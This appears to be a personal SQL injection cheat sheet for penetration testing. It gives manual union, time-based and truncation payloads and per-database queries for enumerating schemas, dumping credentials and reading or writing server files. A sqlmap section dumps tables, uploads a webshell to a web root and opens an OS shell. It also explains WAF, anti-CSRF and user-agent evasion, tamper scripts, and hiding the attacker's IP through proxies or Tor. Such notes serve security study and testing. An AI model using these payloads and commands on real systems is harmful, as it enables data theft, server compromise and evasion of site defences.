---
layout: default
---

# SQL INJECTION(SQLi)
- [HackTricks](https://book.hacktricks.xyz/pentesting-web/sql-injection)
- [PayLoads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md)
- [NetSPI](https://sqlwiki.netspi.com/injectionTypes/blindBased/#mysql)
- https://tib3rius.com/sqli
- portswigger
- https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/

dbfiddle.uk

We want to find credentials exploring possible DBs and tables. Another way is to read files.


## manual:

admin' or 1=1 LIMIT 1-- -


- `admin' union select 1;-- -`
- FIND ALL DBS:
  `admin' UNION SELECT group_concat(schema_name) FROM information_schema.schemata;-- -`
- FIND TABLES IN DB:
  `admin' UNION SELECT group_concat(table_name) FROM information_schema.tables where table_schema='november';-- -`
- FIND COLUMNS IN TABLE:
  `admin' UNION SELECT group_concat(table_name, ':', column_name) FROM INFORMATION_SCHEMA.columns WHERE table_schema='november';-- -`
- FIND VALUES:
  `admin' UNION SELECT group_concat(one) FROM flag;-- -`
- READ FILES:
  `admin' UNION SELECT load_file('/var/www/html/index.php');-- -`

## manual time based:
- FIND DB NUMBER OF CHARACTERS:
- `1%20OR%20IF(LENGTH((SELECT%20database()))=5,SLEEP(1),0)%23`


## SQL Truncation

SQL truncation is a flaw in the database configuration in which an input is truncated (deleted) when added to the database due to surpassing the maximum defined length. The database management system truncates any newly inserted values to fit the width of the designated column size.

So, where can we find this vulnerability ?? it can be found in any web application that allows users to sign up/register for new accounts.

If the database considers spaces as valid characters between inputs and doesn’t do any trimming before storing the values, an attacker can create a duplicate accounts of an existing user like ‘’admin’’ with many additional spaces and characters — ‘’admin++++++random’’ that are too long to be stored in the specified column and gets deleted after passing the max length.

So, instead of storing “admin++++++random’’ as an entry, the database will truncate the second half to fit it in the column (‘’admin +++++’’).

Next time an attacker logs in to the application with the admin account, the database will search for all matching accounts and will consider them valid for logging in. Therefore any entry with username as admin with space or without is a valid entry that can be used to authenticate to the application.

“admin” == ‘admin +++++’




# Identifying SQLi
```sql
' '
'||'
'+'
' AND '1'='1
' OR '1'='1
' -- -
' OR '1'='1;-- -
```

* * *


# Identifying Variants
## MySQL
```sql
AND 'foo' 'bar' = 'foobar'	
```

## PostgreSQL
```sql
AND TO_HEX(1) = '1'	
```

## MSSQL
```sql
AND DATALENGTH('foo') = 3
```

## Oracle
```sql
AND LENGTHB('foo') = '3'	
```

## SQLite
```sql
AND GLOB('foo*', 'foobar') = 1	
```

* * *

# List Databases
## MySQL
```sql
SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA
SELECT db FROM mysql.db
```

## PostgreSQL	
```sql
SELECT datname FROM pg_database
SELECT DISTINCT(schemaname) FROM pg_tables
```

## MSSQL
```sql
SELECT name FROM master.sys.databases
SELECT name FROM master..sysdatabases
```

## Oracle	
```sql
SELECT OWNER FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)
```

## SQLite	
```
N/A
```

* * *

# List Tables
## MySQL	
```sql
SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='[DBNAME]'
SELECT database_name,table_name FROM mysql.innodb_table_stats WHERE database_name='[DBNAME]'
```

## PostgreSQL	
```sql
SELECT tablename FROM pg_tables WHERE schemaname = '[SCHEMA_NAME]'
SELECT table_name FROM information_schema.tables WHERE table_schema='[SCHEMA_NAME]'
```

## MSSQL	
```sql
SELECT table_name FROM information_schema.tables WHERE table_catalog='[DBNAME]'
SELECT name FROM [DBNAME]..sysobjects WHERE xtype='U'
```

## Oracle	
```sql
SELECT OWNER,TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='[DBNAME]'
```

## SQLite	
```sql
SELECT tbl_name FROM sqlite_master WHERE type='table'
```

* * *

# List Columns
## MySQL
```sql
SELECT column_name,column_type FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='[TABLE_NAME]' AND table_schema='[DBNAME]'
```

## PostgreSQL	
```sql
SELECT column_name,data_type FROM information_schema.columns WHERE table_schema='[DBNAME]' AND table_name='[TABLE_NAME]'
```

## MSSQL
```sql
SELECT COL_NAME(OBJECT_ID('[DBNAME].[TABLE_NAME]'), [INDEX])
```

## Oracle	
```sql
SELECT COLUMN_NAME,DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='[TABLE_NAME]' AND OWNER='[DBNAME]'
```

## SQLite
```sql
SELECT MAX(sql) FROM sqlite_master WHERE tbl_name='[TABLE_NAME]'
SELECT name FROM PRAGMA_TABLE_INFO('[TABLE_NAME]')
```

* * *

# DB User
## MySQL
```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

* * *

# User Privileges
Now that we know our user, we can start looking for what privileges we have with that user. First of all, we can test if we have super admin privileges with the following query:

## Super admin privileges
> The query returns Y, which means YES, indicating superuser privileges. 

### MySQL
```sql
SELECT , super_priv FROM mysql.user WHERE user="user";
```

## Other Privileges
> We can also dump other privileges we have directly from the schema, with the following query:

### MySQL
```sql
SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE grantee="user@host";-- -
```

* * *

# Files
First, we have to determine which user we are within the database. While we do not necessarily need database administrator (DBA) privileges to read data, this is becoming more required in modern DBMSes, as only DBA are given such privileges. The same applies to other common databases. If we do have DBA privileges, then it is much more probable that we have file-read privileges. If we do not, then we have to check our privileges to see what we can do. To be able to find our current DB user, we can use any of the following queries:

## Read
### MySQL
```sql
LOAD_FILE('/path/to/file')
```

To be able to write files to the back-end server using a MySQL database, we require three things:

* User with FILE privilege enabled
* MySQL global secure_file_priv variable not enabled
* Write access to the location we want to write to on the back-end server


### PostgreSQL
```sql
PG_READ_FILE('/path/to/file')
```

### MSSQL
```sql
OPENROWSET(BULK 'C:\path\to\file', SINGLE_CLOB)
```

### Oracle	
```sql
utl_file.get_line(utl_file.fopen('/path/to/','file','R'), <buffer>)
```

### SQLite	
```sql
readfile('/path/to/file')
```

## Write
### MySQL
There are hundreds of global variables in a MySQL configuration, and we don't want to retrieve all of them. We will then filter the results to only show the secure_file_priv variable.
If secure_file_priv value is empty, meaning that we can read/write files to any location.

```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

```sql
SELECT 'contents' INTO OUTFILE '/path/to/file'
```

### PostgreSQL
```sql
COPY (SELECT 'contents') TO '/path/to/file'
```

### MSSQL
```sql
execute spWriteStringToFile 'contents', 'C:\path\to\', 'file'
```

### Oracle
```sql
utl_file.put_line(utl_file.fopen('/path/to/','file','R'), <buffer>)
```

### SQLite	
```sql
SELECT writefile('/path/to/file', column_name) FROM table_name
```

* * *

# Union Based
## Detect number of columns
###  MySQL
#### Using Order By
The first way of detecting the number of columns is through the ORDER BY function, which we discussed earlier. We have to inject a query that sorts the results by a column we specified, 'i.e., column 1, column 2, and so on', until we get an error saying the column specified does not exist.

For example, we can start with order by 1, sort by the first column, and succeed, as the table must have at least one column. Then we will do order by 2 and then order by 3 until we reach a number that returns an error, or the page does not show any output, which means that this column number does not exist. The final successful column we successfully sorted by gives us the total number of columns.

If we failed at order by 4, this means the table has three columns, which is the number of columns we were able to sort by successfully. Let us go back to our previous example and attempt the same, with the following payload:

```sql
cn' order by 1;-- -
```

#### Using UNION
The other method is to attempt a Union injection with a different number of columns until we successfully get the results back. The first method always returns the results until we hit an error, while this method always gives an error until we get a success. 

```sql
cn' UNION select 1,2,3;-- -
```

* * *

# SQLMap:
```bash
sqlmap -r request.req --dbs
sqlmap -r request.req -D main --tables
sqlmap -r request.req -D main -T user --columns
sqlmap -r request.req -D main -T user --dump
sqlmap -r req.req --level=5 --risk=3 --batch --file-read=/var/www/html/index.php>
sqlmap -r req.req --level=5 --risk=3 --batch --file-write=/home/kali/Downloads/Exploit/webshell.php --file-dest=/var/www/html/webshell.php
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --threads 10 --level 5 --risk 3 --batch -D soccer_db -T accounts --dump
```
  - `-r` Request file
  - `--level` (max 5)
  - `--risk` (max 3)
  - `--batch` Ask no questions
  - `--no-cast` Assure the correct content
  - `--fresh-queries` Run the query again
  - `--prefix` Add a prefix before every payload
  - `--suffix` Add a suffix after every payload

  **Data Enumeration**
  - `--banner` Database version banner
  - `--current-user` Current user name
  - `--current-db` Current database name 
  - `--is-dba` Checking if the current user has administrator rights.

  **Data Exfiltration**
  - `--dbs` Enumerate databases
  - `--tables` Enumerate DB tables
  - `--columns` Enumerate columns
  - `--dump` Get table values if table is given, if not all of the current database content will be retrieved
  - `-D` Select DB
  - `-T` Select Table
  - `-C` Select Columns
  - `--dump-all --exclude-sysdbs` All the content from all the databases will be retrieve except the content from system databases
  - `--where="name LIKE 'f%'"` Conditional Enumeration

  **Advanced Data Exfiltration**
  - `--schema` Retrieve the structure of all of the tables
  - `--search -T user` Search for databases, tables, and columns
  - `--passwords` Dump the content of system tables containing database-specific credentials

  **OS Exploitation**
  - `--file-read` Path to file that we want to read from server
  - `--file-write` Path to file that we want to upload to server
  - `--file-dest` Path to location that we want to put the uploaded file
  - `--os-shell` Directly execute OS command

## Request
### Curl Commands
One of the best and easiest ways to properly set up an SQLMap request against the specific target (i.e., web request with parameters inside) is by utilizing Copy as cURL feature from within the Network (Monitor) panel inside the Chrome, Edge, or Firefox Developer Tools. 

### GET/POST Requests
In the most common scenario, GET parameters are provided with the usage of option -u/--url, as in the previous example. As for testing POST data, the --data flag can be used.

In such cases, POST parameters uid and name will be tested for SQLi vulnerability. For example, if we have a clear indication that the parameter uid is prone to an SQLi vulnerability, we could narrow down the tests to only this parameter using -p uid. Otherwise, we could mark it inside the provided data with the usage of special marker *.

## Bypassing Web Application Protections
### Anti-CSRF Token Bypass
One of the first lines of defense against the usage of automation tools is the incorporation of anti-CSRF (i.e., Cross-Site Request Forgery) tokens into all HTTP requests, especially those generated as a result of web-form filling.

In most basic terms, each HTTP request in such a scenario should have a (valid) token value available only if the user actually visited and used the page. While the original idea was the prevention of scenarios with malicious links, where just opening these links would have undesired consequences for unaware logged-in users (e.g., open administrator pages and add a new user with predefined credentials), this security feature also inadvertently hardened the applications against the (unwanted) automation.

Nevertheless, SQLMap has options that can help in bypassing anti-CSRF protection. Namely, the most important option is --csrf-token. By specifying the token parameter name (which should already be available within the provided request data), SQLMap will automatically attempt to parse the target response content and search for fresh token values so it can use them in the next request.

Additionally, even in a case where the user does not explicitly specify the token's name via --csrf-token, if one of the provided parameters contains any of the common infixes (i.e. csrf, xsrf, token), the user will be prompted whether to update it in further requests.
```bash
$ sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```

### Unique Value Bypass
In some cases, the web application may only require unique values to be provided inside predefined parameters. Such a mechanism is similar to the anti-CSRF technique described above, except that there is no need to parse the web page content. So, by simply ensuring that each request has a unique value for a predefined parameter, the web application can easily prevent CSRF attempts while at the same time averting some of the automation tools. For this, the option --randomize should be used, pointing to the parameter name containing a value which should be randomized before being sent.
```bash
$ sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5
```

### Calculated Parameter Bypass
Another similar mechanism is where a web application expects a proper parameter value to be calculated based on some other parameter value(s). Most often, one parameter value has to contain the message digest (e.g. h=MD5(id)) of another one. To bypass this, the option --eval should be used, where a valid Python code is being evaluated just before the request is being sent to the target.
```bash
$ sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 
```

### IP Address Concealing
In case we want to conceal our IP address, or if a certain web application has a protection mechanism that blacklists our current IP address, we can try to use a proxy or the anonymity network Tor. A proxy can be set with the option --proxy (e.g. --proxy="socks4://177.39.187.70:33283"), where we should add a working proxy.

In addition to that, if we have a list of proxies, we can provide them to SQLMap with the option --proxy-file. This way, SQLMap will go sequentially through the list, and in case of any problems (e.g., blacklisting of IP address), it will just skip from current to the next from the list. The other option is Tor network use to provide an easy to use anonymization, where our IP can appear anywhere from a large list of Tor exit nodes. When properly installed on the local machine, there should be a SOCKS4 proxy service at the local port 9050 or 9150. By using switch --tor, SQLMap will automatically try to find the local port and use it appropriately.

If we wanted to be sure that Tor is properly being used, to prevent unwanted behavior, we could use the switch --check-tor. In such cases, SQLMap will connect to the https://check.torproject.org/ and check the response for the intended result (i.e., Congratulations appears inside).

### WAF Bypass
Whenever we run SQLMap, As part of the initial tests, SQLMap sends a predefined malicious looking payload using a non-existent parameter name (e.g. ?pfov=...) to test for the existence of a WAF (Web Application Firewall). There will be a substantial change in the response compared to the original in case of any protection between the user and the target. For example, if one of the most popular WAF solutions (ModSecurity) is implemented, there should be a 406 - Not Acceptable response after such a request.

In case of a positive detection, to identify the actual protection mechanism, SQLMap uses a third-party library identYwaf, containing the signatures of 80 different WAF solutions. If we wanted to skip this heuristical test altogether (i.e., to produce less noise), we can use switch --skip-waf.

### User-agent Blacklisting Bypass
In case of immediate problems (e.g., HTTP error code 5XX from the start) while running SQLMap, one of the first things we should think of is the potential blacklisting of the default user-agent used by SQLMap (e.g. User-agent: sqlmap/1.4.9 (http://sqlmap.org)).

This is trivial to bypass with the switch --random-agent, which changes the default user-agent with a randomly chosen value from a large pool of values used by browsers.

### Tamper Scripts
Finally, one of the most popular mechanisms implemented in SQLMap for bypassing WAF/IPS solutions is the so-called "tamper" scripts. Tamper scripts are a special kind of (Python) scripts written for modifying requests just before being sent to the target, in most cases to bypass some protection.

For example, one of the most popular tamper scripts between is replacing all occurrences of greater than operator (>) with NOT BETWEEN 0 AND #, and the equals operator (=) with BETWEEN # AND #. This way, many primitive protection mechanisms (focused mostly on preventing XSS attacks) are easily bypassed, at least for SQLi purposes.

Tamper scripts can be chained, one after another, within the --tamper option (e.g. --tamper=between,randomcase), where they are run based on their predefined priority. A priority is predefined to prevent any unwanted behavior, as some scripts modify payloads by modifying their SQL syntax (e.g. ifnull2ifisnull). In contrast, some tamper scripts do not care about the inner content (e.g. appendnullbyte).

Tamper scripts can modify any part of the request, although the majority change the payload content. The most notable tamper scripts are the following:

| Tamper-Script                | Description                                                                 |
|------------------------------|-----------------------------------------------------------------------------|
| 0eunion                      | Replaces instances of UNION with e0UNION                                    |
| base64encode                 | Base64-encodes all characters in a given payload                            |
| between                      | Replaces greater than operator (>) with NOT BETWEEN 0 AND # and equals operator (=) with BETWEEN # AND # |
| commalesslimit               | Replaces (MySQL) instances like LIMIT M, N with LIMIT N OFFSET M counterpart |
| equaltolike                  | Replaces all occurrences of operator equal (=) with LIKE counterpart         |
| halfversionedmorekeywords    | Adds (MySQL) versioned comment before each keyword                          |
| modsecurityversioned         | Embraces complete query with (MySQL) versioned comment                      |
| modsecurityzeroversioned     | Embraces complete query with (MySQL) zero-versioned comment                 |
| percentage                   | Adds a percentage sign (%) in front of each character (e.g. SELECT -> %S%E%L%E%C%T) |
| plus2concat                  | Replaces plus operator (+) with (MsSQL) function CONCAT() counterpart        |
| randomcase                   | Replaces each keyword character with random case value (e.g. SELECT -> SEleCt) |
| space2comment                | Replaces space character ( ) with comments `/                              |
| space2dash                   | Replaces space character ( ) with a dash comment (--) followed by a random string and a new line (\n) |
| space2hash                   | Replaces (MySQL) instances of space character ( ) with a pound character (#) followed by a random string and a new line (\n) |
| space2mssqlblank             | Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters |
| space2plus                   | Replaces space character ( ) with plus (+)                                  |
| space2randomblank            | Replaces space character ( ) with a random blank character from a valid set of alternate characters |
| symboliclogical              | Replaces AND and OR logical operators with their symbolic counterparts (&& and ||) |
| versionedkeywords            | Encloses each non-function keyword with (MySQL) versioned comment           |
| versionedmorekeywords        | Encloses each keyword with (MySQL) versioned comment                        |


To get a whole list of implemented tamper scripts, along with the description as above, switch --list-tampers can be used. We can also develop custom Tamper scripts for any custom type of attack, like a second-order SQLi.

### Miscellaneous Bypasses
Out of other protection bypass mechanisms, there are also two more that should be mentioned. The first one is the Chunked transfer encoding, turned on using the switch --chunked, which splits the POST request's body into so-called "chunks." Blacklisted SQL keywords are split between chunks in a way that the request containing them can pass unnoticed.

The other bypass mechanisms is the HTTP parameter pollution (HPP), where payloads are split in a similar way as in case of --chunked between different same parameter named values (e.g. ?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...), which are concatenated by the target platform if supporting it (e.g. ASP).